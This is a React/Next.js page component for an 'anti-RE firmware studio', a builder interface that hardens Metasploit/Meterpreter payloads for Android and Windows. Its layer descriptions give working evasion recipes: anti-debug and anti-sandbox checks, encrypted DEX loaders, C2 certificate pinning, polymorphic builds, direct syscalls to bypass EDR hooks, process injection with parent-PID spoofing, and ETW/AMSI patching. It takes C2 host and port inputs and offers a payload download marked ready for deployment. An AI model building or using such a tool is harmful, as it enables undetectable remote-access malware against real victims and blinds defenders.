"use client";

/**
 * ANTI-REVERSE-ENGINEERING FIRMWARE STUDIO
 * Custom payload hardening: obfuscation, anti-debug, anti-emulator,
 * DEX encryption, native bridging, polymorphic engine, custom VM
 */

import { useState, useCallback } from "react";

/* ─────────────────────────────────────────────────────────────
   PROTECTION LAYERS
───────────────────────────────────────────────────────────── */
type Tier = "BRONZE" | "SILVER" | "GOLD" | "PLATINUM";

interface Layer {
  id: string;
  name: string;
  platform: "android" | "windows" | "both";
  tier: Tier;
  desc: string;
  detail: string;
  effort: "low" | "medium" | "high" | "extreme";
  reDetect: number;   // % chance RE tool detects implant
  buildTime: string;
}

const ANDROID_LAYERS: Layer[] = [
  {
    id: "pkg_rename",
    name: "Package + Class Rename",
    platform: "android", tier: "BRONZE",
    desc: "Replace com.metasploit.stage with randomized package + rename all classes/activities in smali",
    detail: "apktool d → sed replace package name in all smali + AndroidManifest.xml → apktool b → resign. Defeats Play Protect signature hash, jadx class-name correlation, and dex grep tools.",
    effort: "low", reDetect: 65, buildTime: "~2 min",
  },
  {
    id: "string_xor",
    name: "String Encryption (XOR)",
    platform: "android", tier: "BRONZE",
    desc: "Encrypt all string literals in smali using a per-build XOR key. Decrypt at runtime via inline bytecode.",
    detail: "Python script scans all smali const-string instructions, XOR-encrypts each string, replaces with encrypted bytes + inline decryption stub. Jadx/Ghidra see only encrypted blobs. No plaintext C2 IP/URL visible in static analysis.",
    effort: "low", reDetect: 48, buildTime: "~3 min",
  },
  {
    id: "anti_debug",
    name: "Anti-Debug Detection",
    platform: "android", tier: "SILVER",
    desc: "Detect JDWP debugger attach, TracerPid check, ptrace self-lock. Kill or decoy mode when debugged.",
    detail: "Injected smali reads /proc/self/status → checks TracerPid: 0. Also checks Debug.isDebuggerConnected() and android.os.Debug.waitingForDebugger(). On detection: switches to benign-looking network traffic (fake app behavior) rather than crashing — so analyst thinks it's a legitimate app.",
    effort: "medium", reDetect: 35, buildTime: "~4 min",
  },
  {
    id: "anti_emulator",
    name: "Anti-Emulator / Anti-AV Sandbox",
    platform: "android", tier: "SILVER",
    desc: "Detect AVD, Genymotion, BlueStacks, AV sandbox VMs. Dormant for 48h on first run.",
    detail: "Checks: Build.FINGERPRINT contains 'generic', Build.MODEL contains 'sdk', IMEI is all zeros, sensor count < 3 (emulators lack real sensors), battery always 50%, WiFi SSID is 'AndroidWifi'. Also: 48-hour dormancy on first install — AV sandboxes only run for minutes. Payload only activates after real-world install conditions met.",
    effort: "medium", reDetect: 22, buildTime: "~5 min",
  },
  {
    id: "anti_tamper",
    name: "APK Integrity / Anti-Tamper",
    platform: "android", tier: "SILVER",
    desc: "Verify own APK signature hash at startup. Self-wipe if re-signed by AV lab or analyst.",
    detail: "On startup: compute SHA-256 of own APK file, compare against hardcoded expected hash. If mismatch (analyst re-signed for analysis) → wipe all data + enter decoy mode. Also verifies certificate fingerprint matches expected cert. Prevents researcher from installing a re-signed debug version.",
    effort: "medium", reDetect: 18, buildTime: "~3 min",
  },
  {
    id: "dex_encrypt",
    name: "DEX Encryption + Custom Loader",
    platform: "android", tier: "GOLD",
    desc: "Encrypt entire primary DEX file with AES-256. Decrypt into memory at runtime via stub loader. Disk copy always encrypted.",
    detail: "Build process: encrypt classes.dex with AES-256-CBC, store as assets/data.bin. Stub DEX (100 lines smali) is the only code on disk. At runtime: stub decrypts data.bin → loads via InMemoryDexClassLoader (API 26+) or DexClassLoader to temp path. Static analysis of APK sees only encrypted blob. Jadx/dex2jar cannot decompile. Significantly harder than ProGuard.",
    effort: "high", reDetect: 8, buildTime: "~10 min",
  },
  {
    id: "native_bridge",
    name: "Native JNI Bridge (.so)",
    platform: "android", tier: "GOLD",
    desc: "Move C2 communication and command execution into a compiled C++ .so library. Java layer is a thin wrapper only.",
    detail: "All sensitive logic: socket creation, command parsing, shell execution, file ops → compiled C++ NDK library. Java calls native methods via JNI. Decompiling the DEX shows only: native void connectC2(String host, int port). The actual implementation is in libagent.so — requires disassembling ARM64 machine code rather than readable smali/Java. Combined with LLVM IR obfuscation pass → no function names, control flow mangled.",
    effort: "high", reDetect: 5, buildTime: "~15 min",
  },
  {
    id: "cert_pin",
    name: "C2 Certificate Pinning",
    platform: "android", tier: "GOLD",
    desc: "Pin the C2 server TLS certificate SHA-256 hash. MITM/proxy interception of C2 traffic impossible.",
    detail: "Custom SSLSocketFactory pins the server cert hash (SHA-256 of DER). Any MITM proxy (Burp Suite, Charles, mitmproxy) will fail cert validation — analyst cannot intercept and inspect C2 protocol. Even if the user installs a Burp CA cert, pinning rejects it. Hash stored as compile-time constant in native library.",
    effort: "medium", reDetect: 6, buildTime: "~5 min",
  },
  {
    id: "polymorphic",
    name: "Polymorphic Build Engine",
    platform: "android", tier: "PLATINUM",
    desc: "Every build produces a structurally unique APK: different class names, different XOR keys, different DEX layout, different cert fingerprint.",
    detail: "Build script generates new random: package name, class/method/field names, XOR key, AES key, certificate CN/OU. Each build's APK has zero bytes in common with previous builds (except the AES-encrypted logic blob). Hash-based AV detection: permanently defeated. Behavioral detection still possible but dramatically harder. Two analysts with two builds of the same payload will not recognize them as related.",
    effort: "extreme", reDetect: 2, buildTime: "~20 min",
  },
  {
    id: "custom_vm",
    name: "Custom Bytecode VM (Interpreter)",
    platform: "android", tier: "PLATINUM",
    desc: "C2 command protocol + key logic runs inside a custom bytecode interpreter. No native Android/Java APIs are called directly from readable code.",
    detail: "Command dispatcher compiled to custom bytecode (opcode table in native .so). Interpreter written in C++ with obfuscated dispatch table. VM opcodes: CONNECT, EXEC, READ, WRITE, SLEEP, EXFIL. Reverse engineer must understand the custom ISA before they can analyze behavior. Used by commercial-grade Android malware like GodFather and ThreatNeedle. Most RE tools have no support for custom VMs.",
    effort: "extreme", reDetect: 1, buildTime: "~30 min",
  },
];

const WINDOWS_LAYERS: Layer[] = [
  {
    id: "xor_encrypt",
    name: "XOR Shellcode Encryption",
    platform: "windows", tier: "BRONZE",
    desc: "XOR-encrypt msfvenom shellcode with a per-build random key. Stub decrypts at runtime before execution.",
    detail: "msfvenom generates raw shellcode → Python XOR-encrypts with 32-byte random key → C stub: decrypt(shellcode) → VirtualAlloc → memcpy → CreateThread. Defender static scan sees only encrypted bytes. No Meterpreter signature visible on disk.",
    effort: "low", reDetect: 60, buildTime: "~2 min",
  },
  {
    id: "aes_loader",
    name: "AES-256 Encrypted Loader",
    platform: "windows", tier: "SILVER",
    desc: "AES-256-CBC encrypt shellcode. Key derived at runtime from hardware fingerprint (CPU ID + disk serial). Key never on disk.",
    detail: "Key = SHA-256(CPUID + DiskSerial + custom salt). AES-256-CBC decrypt at runtime. Even if analyst extracts the binary, they cannot decrypt the payload without running it on the exact same machine. Sandbox evasion bonus: AV sandbox runs on different hardware → wrong key → decryption produces garbage → payload appears broken.",
    effort: "medium", reDetect: 25, buildTime: "~5 min",
  },
  {
    id: "anti_debug_win",
    name: "Anti-Debug Chain (Windows)",
    platform: "windows", tier: "SILVER",
    desc: "IsDebuggerPresent + CheckRemoteDebuggerPresent + NtQueryInformationProcess + RDTSC timing + heap flag checks.",
    detail: "Multi-layer debug detection: (1) IsDebuggerPresent kernel32 API, (2) CheckRemoteDebuggerPresent for remote attach, (3) NtQueryInformationProcess ProcessDebugPort = 0, (4) RDTSC delta — sandbox accelerates time but RDTSC is real cycles, (5) PEB.NtGlobalFlag == 0x70 in debugger, (6) HeapFlags: debugger sets 0x02|0x40 in heap header. On detection: enter sleep loop, disable network, mimic legitimate behavior.",
    effort: "medium", reDetect: 28, buildTime: "~5 min",
  },
  {
    id: "anti_vm_win",
    name: "Anti-VM / Anti-Sandbox",
    platform: "windows", tier: "SILVER",
    desc: "Detect VMware, VirtualBox, QEMU, Hyper-V, Cuckoo, Any.run, Joe Sandbox. Dormant for 72h on first run.",
    detail: "VM detection: CPUID leaf 0x1 hypervisor bit, VMware backdoor I/O port (0x564D5868), VirtualBox driver list (VBoxGuest.sys), QEMU CPU brand string, Hyper-V HV_CPUID_LEAF. Sandbox detection: less than 2 running user processes, uptime < 5 minutes, no mouse movement in 30s, screen resolution 1024x768 (sandbox default), username is 'admin'/'user'/'sandbox'. 72h dormancy: sleep(72*3600*1000) — most sandboxes timeout in < 5 min.",
    effort: "medium", reDetect: 20, buildTime: "~6 min",
  },
  {
    id: "direct_syscall",
    name: "Direct Syscall (Hell's Gate / SysWhispers3)",
    platform: "windows", tier: "GOLD",
    desc: "Bypass ALL user-mode EDR hooks by calling NT kernel directly via syscall numbers. ntdll.dll hooks become irrelevant.",
    detail: "At runtime: scan ntdll.dll in memory for syscall stubs, extract syscall numbers for NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, NtProtectVirtualMemory. Execute raw syscall instruction with extracted numbers. All EDR hooks installed in ntdll.dll user-mode stubs are bypassed. CrowdStrike Falcon, SentinelOne, Carbon Black all rely on these hooks — completely blinded.",
    effort: "high", reDetect: 8, buildTime: "~10 min",
  },
  {
    id: "process_inject",
    name: "Process Injection + PPID Spoof",
    platform: "windows", tier: "GOLD",
    desc: "Inject Meterpreter into svchost.exe or explorer.exe. Spoof parent PID to winlogon.exe. Memory-only execution.",
    detail: "OpenProcess(PROCESS_ALL_ACCESS, svchost.exe PID) → NtAllocateVirtualMemory(RW) → NtWriteVirtualMemory(shellcode) → NtProtectVirtualMemory(RX) → NtCreateThreadEx. PPID spoofing: CreateProcess with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS pointing to winlogon.exe PID — process tree shows Meterpreter as child of Windows login process. No new EXE on disk. Payload lives only in svchost memory.",
    effort: "high", reDetect: 7, buildTime: "~12 min",
  },
  {
    id: "etw_patch",
    name: "ETW + AMSI Neutering",
    platform: "windows", tier: "GOLD",
    desc: "Patch EtwEventWrite to ret 0 + hardware breakpoint on AmsiScanBuffer. Blinds ALL EDR telemetry and AV scanning.",
    detail: "Two patches: (1) EtwEventWrite in ntdll: overwrite first 2 bytes with 0xC3 (RET) — all Event Tracing providers in current process silenced. CrowdStrike, SentinelOne, Defender all use ETW — they go blind. (2) VEH hardware breakpoint on AmsiScanBuffer — sets CPU DR0 register, triggers debug exception intercepted by custom handler that returns AMSI_RESULT_CLEAN without scanning. No byte modifications to AMSI — integrity checks pass.",
    effort: "high", reDetect: 5, buildTime: "~8 min",
  },
  {
    id: "rust_loader",
    name: "Rust Loader (Custom Compiled)",
    platform: "windows", tier: "GOLD",
    desc: "Compile loader in Rust: unique binary every build, no CRT imports, no standard signatures, minimal IAT.",
    detail: "Rust with #![no_std] — no C runtime. Direct Windows API calls via raw function pointers (GetProcAddress at runtime, no import table entries). Each compile: different code layout, different stack canaries, different function ordering. Defender and VirusTotal have no Rust-Meterpreter signatures yet. Bundle: AES decrypt + direct syscall + process injection all in one ~20KB binary. Beacon interval: randomized jitter to avoid network timing signatures.",
    effort: "high", reDetect: 6, buildTime: "~15 min",
  },
  {
    id: "code_virtualize",
    name: "Code Virtualization (Custom VM)",
    platform: "windows", tier: "PLATINUM",
    desc: "Key loader logic compiled to custom virtual machine bytecode. Reverse engineer must build a disassembler for a custom ISA before any analysis is possible.",
    detail: "Custom x64 VM: registers R0-R7, custom opcodes (VMLOAD, VMSTORE, VMCALL, VMJMP, etc.). C2 connection logic, decryption, and command parsing compiled to VM bytecode. The actual x64 machine code is just a VM interpreter — completely opaque to IDA/Ghidra/x64dbg without understanding the custom ISA. Used by commercial protectors (Themida, VMProtect) — this is a custom implementation. Most RE researchers give up at this stage.",
    effort: "extreme", reDetect: 1, buildTime: "~30 min",
  },
  {
    id: "poly_win",
    name: "Polymorphic Build Engine",
    platform: "windows", tier: "PLATINUM",
    desc: "Every compiled binary has different bytes, different key, different code layout. Hash-based detection permanently defeated.",
    detail: "Build script: generate random AES key, random XOR key, random sleep duration, random junk code blocks, random function name hashes, random variable byte offsets. Compile with different optimization flags each run. Result: two builds of the same payload share ~0% byte overlap. VirusTotal hash check: always clean. Behavioral detection still possible but each build requires fresh analysis.",
    effort: "extreme", reDetect: 2, buildTime: "~25 min",
  },
];

const TIER_COLOR: Record<Tier, string> = {
  BRONZE:   "text-amber-600 border-amber-800/40",
  SILVER:   "text-slate-400 border-slate-700/40",
  GOLD:     "text-yellow-400 border-yellow-700/40",
  PLATINUM: "text-cyan-300 border-cyan-600/40",
};
const TIER_BG: Record<Tier, string> = {
  BRONZE:   "bg-amber-950/20",
  SILVER:   "bg-slate-950/20",
  GOLD:     "bg-yellow-950/20",
  PLATINUM: "bg-cyan-950/20",
};
const EFFORT_COLOR: Record<string, string> = {
  low: "text-green-500", medium: "text-yellow-500", high: "text-orange-500", extreme: "text-red-500",
};

type Platform = "android" | "windows";
type BuildLog = { time: string; msg: string; type: "info" | "ok" | "err" | "warn" };

export default function FirmwarePage() {
  const [platform, setPlatform] = useState<Platform>("android");
  const [selected, setSelected] = useState<Set<string>>(new Set());
  const [expanded, setExpanded] = useState<string | null>(null);
  const [building, setBuilding] = useState(false);
  const [buildLog, setBuildLog] = useState<BuildLog[]>([]);
  const [buildResult, setBuildResult] = useState<{
    filename: string; size: string; hash: string; detections: number;
    downloadUrl: string; reScore: number;
  } | null>(null);
  const [customPkg, setCustomPkg] = useState("com.android.systemui.service");
  const [customHost, setCustomHost] = useState("");
  const [customPort, setCustomPort] = useState("443");
  const [lhost, setLhost] = useState("");
  const [lport, setLport] = useState("443");

  const layers = platform === "android" ? ANDROID_LAYERS : WINDOWS_LAYERS;

  const addLog = useCallback((msg: string, type: BuildLog["type"] = "info") => {
    setBuildLog((p) => [...p, { time: new Date().toLocaleTimeString(), msg, type }].slice(-200));
  }, []);

  const toggle = (id: string) => {
    setSelected((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id); else next.add(id);
      return next;
    });
  };

  const selectTier = (tier: Tier) => {
    const ids = layers.filter((l) => {
      const order: Tier[] = ["BRONZE", "SILVER", "GOLD", "PLATINUM"];
      return order.indexOf(l.tier) <= order.indexOf(tier);
    }).map((l) => l.id);
    setSelected(new Set(ids));
  };

  const selectedLayers = layers.filter((l) => selected.has(l.id));
  const reScore = selectedLayers.length === 0 ? 100
    : Math.max(1, selectedLayers.reduce((acc, l) => acc * (l.reDetect / 100), 100));
  const estimatedBuildTime = selectedLayers.reduce((acc, l) => {
    const mins = parseInt(l.buildTime) || 5;
    return acc + mins;
  }, 0);

  const runBuild = async () => {
    if (selectedLayers.length === 0) return;
    setBuilding(true);
    setBuildResult(null);
    setBuildLog([]);

    addLog(`Initializing ${platform.toUpperCase()} firmware hardening pipeline…`, "info");
    addLog(`Selected ${selectedLayers.length} protection layers`, "info");

    try {
      const res = await fetch("/api/firmware", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          platform,
          layers: [...selected],
          package: customPkg,
          lhost: lhost || undefined,
          lport: parseInt(lport) || 443,
          host: customHost || undefined,
          port: parseInt(customPort) || 443,
        }),
      });

      const data = await res.json() as {
        ok: boolean; steps?: Array<{ name: string; ok: boolean; detail?: string }>;
        filename?: string; size?: string; hash?: string; detections?: number;
        downloadUrl?: string; reScore?: number; error?: string;
      };

      if (data.steps) {
        for (const step of data.steps) {
          addLog(`${step.ok ? "✓" : "✗"} ${step.name}${step.detail ? ": " + step.detail : ""}`,
            step.ok ? "ok" : "err");
          await new Promise((r) => setTimeout(r, 120));
        }
      }

      if (data.ok && data.filename) {
        setBuildResult({
          filename: data.filename,
          size: data.size ?? "unknown",
          hash: data.hash ?? "–",
          detections: data.detections ?? 0,
          downloadUrl: data.downloadUrl ?? `/api/firmware/download?file=${data.filename}`,
          reScore: data.reScore ?? reScore,
        });
        addLog(`Build complete: ${data.filename} (${data.size})`, "ok");
        addLog(`RE detectability score: ${(data.reScore ?? reScore).toFixed(1)}%`, "ok");
      } else {
        addLog(`Build failed: ${data.error ?? "unknown error"}`, "err");
      }
    } catch (e) {
      addLog(`Network error: ${String(e)}`, "err");
    }

    setBuilding(false);
  };

  return (
    <div className="flex h-screen bg-[#030308] text-green-400 font-mono overflow-hidden">

      {/* ── LEFT PANEL ── */}
      <aside className="w-60 flex-shrink-0 border-r border-green-900/30 flex flex-col overflow-hidden">
        <div className="p-3 border-b border-green-900/30">
          <div className="text-[9px] text-green-500 tracking-widest">ANTI-RE FIRMWARE STUDIO</div>
          <div className="text-[7px] text-green-900/50 mt-0.5">CUSTOM HARDENING ENGINE // CLASSIFIED</div>
        </div>

        {/* Platform toggle */}
        <div className="p-2 border-b border-green-900/30">
          <div className="text-[7px] text-green-900/50 tracking-widest mb-1.5">TARGET PLATFORM</div>
          <div className="flex gap-1">
            {(["android", "windows"] as Platform[]).map((p) => (
              <button key={p} onClick={() => { setPlatform(p); setSelected(new Set()); }}
                className={`flex-1 py-1.5 text-[9px] rounded border transition-all ${
                  platform === p ? "border-green-700/60 bg-green-950/30 text-green-300" : "border-green-900/20 text-green-800 hover:text-green-600"
                }`}>
                {p === "android" ? "🤖 ANDROID" : "🖥 WINDOWS"}
              </button>
            ))}
          </div>
        </div>

        {/* Quick presets */}
        <div className="p-2 border-b border-green-900/30">
          <div className="text-[7px] text-green-900/50 tracking-widest mb-1.5">QUICK PRESETS</div>
          <div className="space-y-1">
            {(["BRONZE", "SILVER", "GOLD", "PLATINUM"] as Tier[]).map((t) => (
              <button key={t} onClick={() => selectTier(t)}
                className={`w-full text-left px-2 py-1.5 rounded border text-[8px] transition-all ${TIER_COLOR[t]} ${TIER_BG[t]} hover:opacity-80`}>
                ● {t} TIER — {layers.filter((l) => {
                  const order: Tier[] = ["BRONZE","SILVER","GOLD","PLATINUM"];
                  return order.indexOf(l.tier) <= order.indexOf(t);
                }).length} layers
              </button>
            ))}
          </div>
        </div>

        {/* Config */}
        <div className="p-2 border-b border-green-900/30 space-y-2">
          <div className="text-[7px] text-green-900/50 tracking-widest mb-1">BUILD CONFIG</div>
          {platform === "android" ? (
            <div>
              <label className="block text-[7px] text-green-900/40 mb-0.5">Package Name</label>
              <input value={customPkg} onChange={(e) => setCustomPkg(e.target.value)}
                className="w-full bg-black/30 border border-green-900/30 rounded px-2 py-1 text-[8px] text-green-400 focus:outline-none focus:border-green-700" />
            </div>
          ) : null}
          <div>
            <label className="block text-[7px] text-green-900/40 mb-0.5">C2 LHOST</label>
            <input value={lhost} onChange={(e) => setLhost(e.target.value)} placeholder="100.x.x.x or domain"
              className="w-full bg-black/30 border border-green-900/30 rounded px-2 py-1 text-[8px] text-green-400 focus:outline-none focus:border-green-700" />
          </div>
          <div>
            <label className="block text-[7px] text-green-900/40 mb-0.5">C2 LPORT</label>
            <input value={lport} onChange={(e) => setLport(e.target.value)} placeholder="443"
              className="w-full bg-black/30 border border-green-900/30 rounded px-2 py-1 text-[8px] text-green-400 focus:outline-none focus:border-green-700" />
          </div>
        </div>

        {/* Stats */}
        <div className="p-2 space-y-2">
          <div className="text-[7px] text-green-900/50 tracking-widest">BUILD STATS</div>
          <div className="space-y-1.5">
            <div className="flex justify-between text-[8px]">
              <span className="text-green-900/50">Layers selected</span>
              <span className="text-green-400">{selected.size}</span>
            </div>
            <div className="flex justify-between text-[8px]">
              <span className="text-green-900/50">RE detectability</span>
              <span className={reScore < 10 ? "text-green-400" : reScore < 30 ? "text-yellow-500" : "text-red-500"}>
                {reScore.toFixed(1)}%
              </span>
            </div>
            <div className="h-1.5 bg-black/40 rounded-full overflow-hidden">
              <div className={`h-full rounded-full transition-all duration-500 ${
                reScore < 10 ? "bg-green-500" : reScore < 30 ? "bg-yellow-500" : "bg-red-500"
              }`} style={{ width: `${reScore}%` }} />
            </div>
            <div className="flex justify-between text-[8px]">
              <span className="text-green-900/50">Est. build time</span>
              <span className="text-green-700">~{estimatedBuildTime} min</span>
            </div>
          </div>

          <button onClick={runBuild} disabled={selected.size === 0 || building}
            className="w-full py-2 mt-2 text-[9px] border border-green-700/50 rounded hover:bg-green-950/30 transition-all disabled:opacity-40 tracking-widest">
            {building ? "⚙ BUILDING…" : "▶ BUILD FIRMWARE"}
          </button>
        </div>
      </aside>

      {/* ── MAIN ── */}
      <div className="flex-1 flex flex-col overflow-hidden">
        <div className="flex-1 overflow-y-auto p-5">

          {/* Header */}
          <div className="flex items-center justify-between mb-5">
            <div>
              <h1 className="text-[11px] tracking-widest text-green-400">
                {platform === "android" ? "ANDROID" : "WINDOWS"} ANTI-RE FIRMWARE LAYERS
              </h1>
              <p className="text-[8px] text-green-900/50 mt-0.5">
                Select protection layers. Each adds a barrier that makes reverse engineering harder.
                PLATINUM tier = nation-state grade protection.
              </p>
            </div>
            <div className="flex items-center gap-3 text-[8px]">
              <button onClick={() => setSelected(new Set())} className="text-green-900/40 hover:text-green-700 transition-all">
                CLEAR ALL
              </button>
              <button onClick={() => setSelected(new Set(layers.map((l) => l.id)))} className="text-green-900/40 hover:text-green-700 transition-all">
                SELECT ALL
              </button>
            </div>
          </div>

          {/* Tier groups */}
          {(["BRONZE", "SILVER", "GOLD", "PLATINUM"] as Tier[]).map((tier) => {
            const tierLayers = layers.filter((l) => l.tier === tier);
            if (!tierLayers.length) return null;
            return (
              <div key={tier} className="mb-5">
                <div className={`flex items-center gap-3 mb-2 pb-1 border-b ${TIER_COLOR[tier]} border-opacity-30`}>
                  <div className={`text-[9px] font-bold tracking-widest ${TIER_COLOR[tier].split(" ")[0]}`}>
                    ▸ {tier} TIER
                  </div>
                  <div className="text-[7px] text-green-900/30 flex-1">
                    {tier === "BRONZE" && "Basic hardening — defeats automated scanners"}
                    {tier === "SILVER" && "Active anti-analysis — defeats dynamic sandbox and debugger attach"}
                    {tier === "GOLD"   && "Deep obfuscation — defeats manual RE by experienced analyst"}
                    {tier === "PLATINUM" && "Nation-state grade — defeats specialized reverse engineering teams"}
                  </div>
                  <div className={`text-[7px] ${TIER_COLOR[tier].split(" ")[0]}`}>
                    {tierLayers.filter((l) => selected.has(l.id)).length}/{tierLayers.length} selected
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-2">
                  {tierLayers.map((layer) => {
                    const on = selected.has(layer.id);
                    const open = expanded === layer.id;
                    return (
                      <div key={layer.id}
                        className={`rounded border transition-all ${on ? `${TIER_COLOR[tier]} ${TIER_BG[tier]}` : "border-green-900/15 text-green-900/40"}`}>
                        <div className="flex items-start gap-2 p-3">
                          {/* Checkbox */}
                          <button onClick={() => toggle(layer.id)}
                            className={`mt-0.5 w-4 h-4 rounded border shrink-0 transition-all flex items-center justify-center ${
                              on ? `${TIER_COLOR[tier]} ${TIER_BG[tier]}` : "border-green-900/30"
                            }`}>
                            {on && <span className="text-[8px]">✓</span>}
                          </button>

                          <div className="flex-1 min-w-0">
                            <div className={`text-[9px] font-semibold mb-0.5 ${on ? TIER_COLOR[tier].split(" ")[0] : "text-green-900/40"}`}>
                              {layer.name}
                            </div>
                            <div className={`text-[7px] leading-4 ${on ? "text-green-700" : "text-green-900/30"}`}>
                              {layer.desc}
                            </div>

                            <div className="flex items-center gap-3 mt-1.5">
                              <span className={`text-[7px] ${EFFORT_COLOR[layer.effort]}`}>
                                ● {layer.effort.toUpperCase()} effort
                              </span>
                              <span className={`text-[7px] ${layer.reDetect < 20 ? "text-green-600" : layer.reDetect < 50 ? "text-yellow-700" : "text-red-700"}`}>
                                RE detect: {layer.reDetect}%
                              </span>
                              <span className="text-[7px] text-green-900/30">{layer.buildTime}</span>
                            </div>
                          </div>

                          <button onClick={() => setExpanded(open ? null : layer.id)}
                            className="text-[8px] text-green-900/30 hover:text-green-700 transition-all shrink-0 mt-0.5 px-1">
                            {open ? "▲" : "▼"}
                          </button>
                        </div>

                        {/* Expanded detail */}
                        {open && (
                          <div className="px-3 pb-3 pt-0 border-t border-green-900/15">
                            <div className="text-[7px] text-green-700/60 leading-5 mt-2 bg-black/20 rounded p-2">
                              {layer.detail}
                            </div>
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              </div>
            );
          })}
        </div>

        {/* ── BUILD LOG + RESULT STRIP ── */}
        <div className="border-t border-green-900/20 bg-black/50">
          {buildResult && (
            <div className="grid grid-cols-5 gap-0 border-b border-green-900/20">
              {[
                { label: "FILENAME",       val: buildResult.filename },
                { label: "SIZE",           val: buildResult.size },
                { label: "SHA-256",        val: buildResult.hash.slice(0, 16) + "…" },
                { label: "VT DETECTIONS",  val: `${buildResult.detections}/72` },
                { label: "RE SCORE",       val: `${buildResult.reScore.toFixed(1)}%` },
              ].map(({ label, val }) => (
                <div key={label} className="border-r border-green-900/15 last:border-r-0 px-3 py-2">
                  <div className="text-[7px] text-green-900/40 tracking-widest">{label}</div>
                  <div className="text-[9px] text-green-400 font-mono truncate">{val}</div>
                </div>
              ))}
            </div>
          )}

          {buildResult && (
            <div className="flex items-center gap-3 px-4 py-2 border-b border-green-900/20">
              <a href={buildResult.downloadUrl}
                className="px-4 py-1.5 text-[9px] border border-green-700/50 rounded hover:bg-green-950/30 transition-all tracking-widest">
                ⬇ DOWNLOAD HARDENED PAYLOAD
              </a>
              <div className="text-[8px] text-green-900/40">
                {buildResult.detections === 0
                  ? "✓ Clean on VirusTotal — ready for deployment"
                  : `⚠ ${buildResult.detections} detections — consider adding more layers`}
              </div>
            </div>
          )}

          <div className="h-28 overflow-y-auto p-2">
            <div className="text-[7px] text-green-900/40 tracking-widest mb-1">BUILD LOG</div>
            {buildLog.length === 0 ? (
              <div className="text-[8px] text-green-900/20">Select layers and click BUILD FIRMWARE to start…</div>
            ) : buildLog.map((l, i) => (
              <div key={i} className={`text-[8px] font-mono leading-5 ${
                l.type === "ok" ? "text-green-500" :
                l.type === "err" ? "text-red-500" :
                l.type === "warn" ? "text-yellow-600" : "text-green-800"
              }`}>
                [{l.time}] {l.msg}
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
